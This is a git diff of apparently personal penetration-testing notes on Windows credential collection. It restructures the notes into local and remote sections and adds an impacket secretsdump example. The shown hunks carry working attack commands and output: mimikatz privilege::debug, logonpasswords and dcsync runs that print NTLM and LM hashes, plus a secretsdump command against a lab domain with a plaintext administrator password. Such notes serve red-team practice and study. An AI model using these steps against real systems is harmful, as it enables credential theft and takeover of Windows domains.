@@ -1,7 +1,9 @@
 
 # Credential Collection
 
-## GET SAM and Security when system running
+## Local
+
+### GET SAM and Security when system running
 
 On remote computer extrach SAM and SYSTEM 
 
@@ -11,7 +13,7 @@ On remote computer extrach SAM and SYSTEM
 
 [Credit](https://superuser.com/a/1088644)
 
-## mimikatz lsass.DMP local analyze
+### mimikatz lsass.DMP local analyze
 
 if we cant run mimikatz on target machine, we can get dump of lsass process and analyze local computer.
 
@@ -67,18 +69,18 @@ Get passwords
 
 
 
-## mimikatz logonpasswords
+### mimikatz logonpasswords
 
  cmd needs to run administrators rights / locally
 
 	PS C:\Users\thor\Desktop\mimikatz\x64> .\mimikatz.exe
 
-	  .###.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53
+	  .####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53
 	 .# ^ #.  "A La Vie, A L'Amour" - (oe.eo)
 	 # / \ #  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilki
 	 # \ / #       > https://blog.gentilkiwi.com/mimikatz
 	 '# v #'       Vincent LE TOUX             ( vincent.letoux@gm
-	  '###'        > https://pingcastle.com / https://mysmartlogon
+	  '####'        > https://pingcastle.com / https://mysmartlogon
 
 	mimikatz # privilege::debug
 	Privilege '20' OK
@@ -114,8 +116,9 @@ Get passwords
 			ssp :
 			credman :
 			
-			
-## mimikatz dcsync
+## Remote
+
+### mimikatz dcsync
 
 authuser should be admin rights
 
@@ -145,3 +148,15 @@ authuser should be admin rights
 	  Hash NTLM: c2d3b9268608fab2b14a8c78c36316aa
 		ntlm- 0: c2d3b9268608fab2b14a8c78c36316aa
 		lm  - 0: 36fa5c99898f8a75a7783f250a6bf892
+
+
+### impacket - Secretsdump
+
+	┌──(kali㉿kali)-[~]
+	└─$ /usr/bin/impacket-secretsdump -just-dc-ntlm valhalla.local/administrator:Pass123\!@valhalla.local -just-dc-user testuser
+	Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
+
+	[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+	[*] Using the DRSUAPI method to get NTDS.DIT secrets
+	valhalla.local\testuser:2117:aad3b435b51404eeaad3b435b51404ee:c718f548c75062ada93250db208d3178:::
+	[*] Cleaning up... 
